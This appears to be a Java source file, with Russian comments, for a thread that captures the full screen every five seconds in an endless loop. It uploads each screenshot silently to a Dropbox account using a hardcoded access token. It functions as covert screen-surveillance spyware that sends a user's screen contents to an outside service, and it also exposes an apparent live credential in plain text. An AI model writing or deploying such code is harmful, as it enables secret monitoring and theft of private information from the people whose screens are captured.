package com.company;

import com.dropbox.core.DbxRequestConfig;
import com.dropbox.core.v2.DbxClientV2;

import javax.imageio.ImageIO;
import java.awt.*;
import java.awt.image.BufferedImage;
import java.io.ByteArrayInputStream;
import java.io.ByteArrayOutputStream;
import java.io.InputStream;
import java.text.SimpleDateFormat;
import java.util.Date;

public class DropboxScrenshot extends Thread {

    // Формат времени
    private SimpleDateFormat formatter = new SimpleDateFormat("yyyyMMdd_HHmmss");

    // Токен для рабботы с dropbox
    private String ACCESS_TOKEN = "b8dcY33oWQkAAAAAAAAAATG4jXj28o4SWJP38D46CaLmVaJXSOAHG4PzoCdLUCai";

    private DbxRequestConfig config = DbxRequestConfig.newBuilder("dropbox/java-tutorial").build();
    private DbxClientV2 client = new DbxClientV2(config, ACCESS_TOKEN);

    @Override
    public void run() {
        for (; ; ) {
            try {
                // Время: сейчас
                Date CurrentTimestamp = new Date();

                Robot robot = new Robot();

                Rectangle screen = new Rectangle(Toolkit.getDefaultToolkit().getScreenSize());

                BufferedImage image = robot.createScreenCapture(screen);
                ByteArrayOutputStream OutPut = new ByteArrayOutputStream();
                ImageIO.write(image, "png", OutPut);

                InputStream in = new ByteArrayInputStream(OutPut.toByteArray());
                client.files().uploadBuilder("/" + formatter.format(CurrentTimestamp) + ".png")
                        .uploadAndFinish(in);

                sleep(5000);
            } catch (Exception ex) {
                ex.printStackTrace();
            }
        }
    }
}
